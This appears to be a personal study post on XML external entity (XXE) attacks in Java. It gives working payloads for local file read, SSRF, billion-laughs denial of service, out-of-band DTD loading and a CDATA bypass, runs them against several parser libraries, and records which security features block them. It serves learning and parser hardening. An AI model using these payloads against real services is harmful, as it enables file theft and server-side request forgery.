---
layout: post
title: LEARN XXE JAVA
categories: [Research]
tags: [XXE,JAVA]
description: Something about XXE java
---

#### Brief intro

* Is

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.

* Ref

[1] [instroduce xxe](https://portswigger.net/web-security/xxe)

[2] [us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf)

[3] [Type of lib parse XML](https://www.kingkk.com/2019/07/XXE%E9%98%B2%E5%BE%A1%E7%AC%94%E8%AE%B0/)

[4] [XML External Entity (XXE) Limitations](https://dzone.com/articles/xml-external-entity-xxe-limitations)

[5] [XMLDTDEntityAttacks](https://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)

* Self Question

```
Diffirent many feature?
What is the purpose of CDATA in XML and XXE Attack ?
```

### Read

* PCDATA:

```
**Parsed Character DATA** is text that will be parsed by a parser. Tags inside the text will be treated as markup and entities will be expanded.
```

* CDATA

```
**Character DATA** is text that will not be parsed by a parser. Tags inside the text will not be treated as markup and entities will not be expanded.
```

* DTD:

```
A DTD defines the structure and the legal elements and attributes of an XML document.
```

* parameter entities:

```
 XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
<!ENTITY %myparameterentity "my parameter entity value" >
And second, parameter entities are referenced using the percent character instead of the usual ampersand:
%myparameterentity;
```

* Internal Entities:

```
An internal entity is one that is defined locally within a DTD.
<!ENTITY entity_name "entity_value">
```

* External Entities:

```
An external entity is one that is defined locally within a DTD or external DTD.
```



### Code to rebuild

pom.xml

```{% highlight xml %}
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>groupId</groupId>
    <artifactId>bit-xxe</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
<dependencies>
        <dependency>
            <groupId>org.dom4j</groupId>
            <artifactId>dom4j</artifactId>
            <version>2.0.0</version>
        </dependency>

        <dependency>
            <groupId>org.jdom</groupId>
            <artifactId>jdom</artifactId>
            <version>1.1.3</version>
        </dependency>

    </dependencies>
</project>
{% endhighlight %}

features

```{% highlight java %}
public interface features {
    String SECURE_PROCESSING = "http://javax.xml.XMLConstants/feature/secure-processing";
    String EXTERNAL_GENERAL_ENTITIES = "http://xml.org/sax/features/external-general-entities";
    String DISALLOW_DOCTYPE_DECL = "http://apache.org/xml/features/disallow-doctype-decl";
    String EXTERNAL_PARAMETER_ENTITIES =  "http://xml.org/sax/features/external-parameter-entities";
    String LOAD_EXTERNAL_DTD = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
}
{% endhighlight %}

payloads

{% highlight java %}
public interface Payloads {
    String flag = "F:\\Research\\java\\XXE\\bit-xxe\\src\\main\\java\\flag.txt";
    String special_character = "F:\\Research\\java\\XXE\\bit-xxe\\src\\main\\java\\fstab";
    String boot = "C:\\boot.ini";
    String internal_dtd = "F:\\Research\\java\\XXE\\bit-xxe\\src\\main\\java\\info.dtd";
    String port = "1446" ;

    String internal = "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "<!ENTITY ac \"Hacker\">]>\n" +
            "<foo>&ac;</foo>";

    String readfile = "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "<!ENTITY ac SYSTEM \"" + flag +"\">]>\n" +
            "<foo>&ac;</foo>";

    String ssrf = "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "<!ENTITY ac SYSTEM \"http://127.0.0.1:" + port + "/pwned\">]>\n" +
            "<foo>&ac;</foo>";

    String ftp ="<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "<!ENTITY ac SYSTEM \"ftp://whoami/file:///etc/passwd\">]>\n" +
            "<foo>&ac;</foo>";

    String Dos = "<!--?xml version=\"1.0\" ?-->\n" +
            "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ELEMENT lolz (#PCDATA)>\n" +
            "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
            "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n" +
            "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
            "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
            "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" +
            "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n" +
            "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n" +
            "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n" +
            "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n" +
            "<tag>&lol9;</tag>";

    String Base64 = "<?xml version=\"1.0\"?>\n" +
        "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>\n";

    String external = "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo SYSTEM \""+internal_dtd+"\">]>\n" +
            "<foo>&ifo;</foo>";

    String external_dtd_oob = "<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \'http://localhost:" + port + "/evil.dtd\'>%remote;%init;%trick;]>";

    String CDATA_Bypass = "<?xml version =\"1.0\"?>\n"+
            "<!DOCTYPE data[\n" +
            "<!ENTITY start \"<![CDATA[<!ENTITY file SYSTEM \""+special_character+"\">]]>\">\n"+
            "]>\n" +
            "<data>&start;</data>";

    String Poc1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
            "<!DOCTYPE xdsec [\n" +
            "        <!ELEMENT methodname ANY >\n" +
            "        <!ENTITY xxe SYSTEM \"http://localhost:" + port + "/test.txt\" >]>\n" +
            "<methodcall>\n" +
            "    <methodname>&xxe;</methodname>\n" +
            "</methodcall>";

    String Poc2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE ANY[\n" +
            "        <!ENTITY poc SYSTEM \"" + flag +"\">]>\n" +
            "<person>\n" +
            "    <age>eeee</age>\n" +
            "    <name>&poc;</name>\n" +
            "    <age>eeee</age>\n" +
            "</person>";

//    String CDATA_Bypass = "<?xml version =\"1.0\"?>\n"+
//            "<!DOCTYPE data[\n" +
//            "<!ENTITY start \"<!CDATA[<!ENTITY file SYSTEM \"file://"+fstab+"\">]]>\">]>\n" +
//            "<foo>&start;</foo>";
}
{% endhighlight %}

### Features

```java
    /**
     * The SAX feature name for secure processing. Turning on this feature
     * might result in a parser rejecting XML documents that are considered
     * "insecure" (having a potential for DOS attacks, for example). The
     * Android XML parsing implementation currently ignores this feature.  
     */
```

```
http://javax.xml.XMLConstants/feature/secure-processing - true
```

> prohibits the loading of some protocols such as http[s] and file.

```
http://apache.org/xml/features/disallow-doctype-decl - true
```

>  the loading of external entities can be prohibited.

```
http://xml.org/sax/features/external-general-entities - false
```

>load external entity is prohibited.

```
http://xml.org/sax/features/external-parameter-entities - false
```

> load parameter entity is prohibited

```
http://apache.org/xml/features/nonvalidating/load-external-dtd - false
```

> load dtd entity is prohibited

### Some libs parse XML

####  DocumentBuilder

```{% highlight java %}
package libs;

import org.w3c.dom.Document;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class DocumentBuilderExample {
    public static void main(String args[]) throws ParserConfigurationException, IOException, SAXException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature(features.SECURE_PROCESSING,true);
        DocumentBuilder builder = dbf.newDocumentBuilder();

        ByteArrayInputStream ip = new ByteArrayInputStream(Payloads.ssrf.getBytes(StandardCharsets.UTF_8));
        Document doc = builder.parse(ip);
        System.out.println(doc.getDocumentElement().getTextContent());
    }
}
{% endhighlight %}

##### LOAD_EXTERNAL_DTD

* Use read_file

* external_dtd_oob.

##### SECURE PROCESSING

> Fail

##### EXTERNAL_GENERAL_ENTITIES 

* external_dtd_oob

##### EXTERNAL_PARAMETER_ENTITIES

While using `external_dtd_oob`, app throw out exeption **Premature end of file**.

> Root cause: Instead of responding blank xml through not converting xml code, it will respond Premature end of file.

* readfile
* ssrf

#### SAXBuilder

{% highlight java %}
package libs;

import org.jdom.Document;
import org.jdom.JDOMException;
import org.jdom.input.SAXBuilder;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class SAXBuilderSample {
    public static void main(String args[]) throws JDOMException, IOException {
        SAXBuilder sb  = new SAXBuilder();
        sb.setFeature(features.SECURE_PROCESSING,true);

        ByteArrayInputStream ip = new ByteArrayInputStream(Payloads.external_dtd_oob.getBytes(StandardCharsets.UTF_8));
        Document doc = sb.build(ip);
    }
}
{% endhighlight %}

##### LOAD_EXTERNAL_DTD

> Feature not working with library

* ssrf
* readfile
* Dos
* external_dtd_oob

##### SECURE PROCESSING

> Feature not working with library

* ssrf
* readfile
* Dos
* external_dtd_oob

##### EXTERAL_GENERAL_ENTITIES

> Feature not working with library

* ssrf
* readfile
* Dos
* external_dtd_oob

##### EXTERNAL_PARAMETER_ENTITIES

* ssrf

##### DISALLOW_DOCTYPE_DECL

> null

#### SAXParserFactory

{% highlight java %}
package libs;

import org.xml.sax.HandlerBase;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class SAXParserFactorySample {
    public static void main(String args[]) throws SAXException, ParserConfigurationException, IOException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature(features.EXTERNAL_GENERAL_ENTITIES,true);
        SAXParser p = spf.newSAXParser();
        ByteArrayInputStream ip = new 		  ByteArrayInputStream(Payloads.external_dtd_oob.getBytes(StandardCharsets.UTF_8));
        p.parse(ip, (HandlerBase) null);
    }
}
{% endhighlight %}

##### LOAD_EXTERNAL_DTD

> null

##### EXTERAL_GENERAL_ENTITIES

> Feature not working with library

* ssrf
* readfile
* Dos
* external_dtd_oob

##### EXTERNAL_PARAMETER_ENTITIES

* ssrf

##### DISALLOW_DOCTYPE_DECL

> null

Ans

```
[2] CDATA have a mission like ` comment `
```